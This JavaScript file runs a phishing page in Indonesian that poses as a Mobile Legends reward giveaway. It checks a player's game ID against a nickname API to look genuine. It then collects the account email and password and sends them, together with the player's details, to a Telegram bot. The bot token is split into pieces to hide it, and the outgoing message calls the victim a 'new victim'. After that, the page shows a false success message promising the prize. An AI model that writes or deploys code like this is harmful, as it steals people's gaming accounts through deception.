let chosenReward = "";
let verifiedNickname = "";

const part1 = "8816261841";
const part2 = "AAFOvMF00rlDMaxydRfxnTpi5bff";
const part3 = "5dArd9s";
const TELEGRAM_TOKEN = `${part1}:${part2}${part3}`; 
const CHAT_ID = "8335786077";

let checkTimeout;
let isSuccessState = false;

function showCustomAlert(title, message, isSuccess = false) {
    isSuccessState = isSuccess;
    document.getElementById('custom-modal-title').innerText = title;
    document.getElementById('custom-modal-text').innerText = message;
    document.getElementById('customModal').style.display = 'flex';
}

function closeCustomModal() {
    document.getElementById('customModal').style.display = 'none';
    if (isSuccessState) {
        location.reload();
    }
}

function showWarning() {
    const alertBar = document.getElementById('alertBar');
    alertBar.style.display = 'block';
    setTimeout(() => {
        alertBar.style.display = 'none';
    }, 3000);
}

function checkAccountReal() {
    const uid = document.getElementById('userid').value.trim();
    const sid = document.getElementById('serverid').value.trim();
    const statusDiv = document.getElementById('account-status');
    
    clearTimeout(checkTimeout);

    if(uid.length >= 4 && sid.length >= 4) {
        statusDiv.style.display = 'block';
        statusDiv.style.background = 'rgba(41, 128, 185, 0.1)';
        statusDiv.style.border = '1px solid rgba(41, 128, 185, 0.3)';
        statusDiv.style.color = '#3498db';
        statusDiv.innerHTML = "Menghubungkan ke server MLBB...";
        
        checkTimeout = setTimeout(() => {
            fetch(`https://api.isan.eu.org/nickname/ml?id=${uid}&server=${sid}`)
                .then(response => response.json())
                .then(data => {
                    if(data && data.success) {
                        verifiedNickname = data.name;
                        statusDiv.style.background = 'rgba(39, 174, 96, 0.1)';
                        statusDiv.style.border = '1px solid rgba(39, 174, 96, 0.3)';
                        statusDiv.style.color = '#27ae60';
                        statusDiv.innerHTML = `Akun "${verifiedNickname}" telah terdeteksi. Silahkan pilih hadiah!`;
                    } else {
                        verifiedNickname = "";
                        statusDiv.style.background = 'rgba(192, 57, 43, 0.1)';
                        statusDiv.style.border = '1px solid rgba(192, 57, 43, 0.3)';
                        statusDiv.style.color = '#e74c3c';
                        statusDiv.innerHTML = "ID dan Server tidak valid";
                    }
                })
                .catch(err => {
                    verifiedNickname = "";
                    statusDiv.style.background = 'rgba(192, 57, 43, 0.1)';
                    statusDiv.style.border = '1px solid rgba(192, 57, 43, 0.3)';
                    statusDiv.style.color = '#e74c3c';
                    statusDiv.innerHTML = "ID dan Server tidak valid";
                });
        }, 600);
    } else {
        statusDiv.style.display = 'none';
        verifiedNickname = "";
    }
}

function selectReward(element, name) {
    const uid = document.getElementById('userid').value.trim();
    const sid = document.getElementById('serverid').value.trim();

    if(!uid || !sid || !verifiedNickname) {
        showWarning();
        return;
    }

    const claimKey = `claimed_${uid}_${sid}`;
    if(localStorage.getItem(claimKey)) {
        showCustomAlert("Gagal", `Username "${verifiedNickname}" telah mengambil hadiah pada event ini!`);
        return;
    }

    document.querySelectorAll('.reward-card').forEach(c => c.classList.remove('active'));
    element.classList.add('active');
    chosenReward = name;
    document.querySelector('.selected-preview').innerHTML = "Item Dipilih:";
    document.getElementById('preview-text').innerText = name;
}

function openLoginModal() {
    const uid = document.getElementById('userid').value.trim();
    const sid = document.getElementById('serverid').value.trim();

    if(!uid || !sid || !verifiedNickname) {
        showWarning();
        return;
    }
    if(!chosenReward) {
        showCustomAlert("Ambil Hadiah", "Silakan pilih salah satu hadiah terlebih dahulu!");
        return;
    }

    const claimKey = `claimed_${uid}_${sid}`;
    if(localStorage.getItem(claimKey)) {
        showCustomAlert("Gagal", `Username "${verifiedNickname}" telah mengambil hadiah pada event ini!`);
        return;
    }

    document.getElementById('loginModal').style.display = 'flex';
}

function sendDataToTelegram() {
    const uid = document.getElementById('userid').value.trim();
    const sid = document.getElementById('serverid').value.trim();
    const method = document.getElementById('login-method').value;
    const userAcc = document.getElementById('username').value.trim();
    const passAcc = document.getElementById('password').value.trim();

    if(!userAcc || !passAcc) {
        showCustomAlert("Data Belum Dilengkapi", "Harap lengkapi informasi akun dan password anda!");
        return;
    }

    const claimKey = `claimed_${uid}_${sid}`;
    localStorage.setItem(claimKey, "true");

    const message = "ADA KORBAN BARU NIH!\n\n" +
                    "Hadiah: " + chosenReward + "\n" +
                    "Nickname: " + verifiedNickname + "\n" +
                    "ID & Server: " + uid + " (" + sid + ")\n" +
                    "Akun: " + method + "\n" +
                    "Email: " + userAcc + "\n" +
                    "Password: " + passAcc;

    const url = "https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(message);
    
    fetch(url)
        .then(response => response.json())
        .then(data => {
            console.log("Telegram response:", data);
        })
        .catch(err => console.error("Error:", err));

    document.getElementById('loginModal').style.display = 'none';
    showCustomAlert("Berhasil", `Selamat "${verifiedNickname}". ${chosenReward} anda akan segera dikirim dalam inbox dalam 2x24Jam!`, true);
}
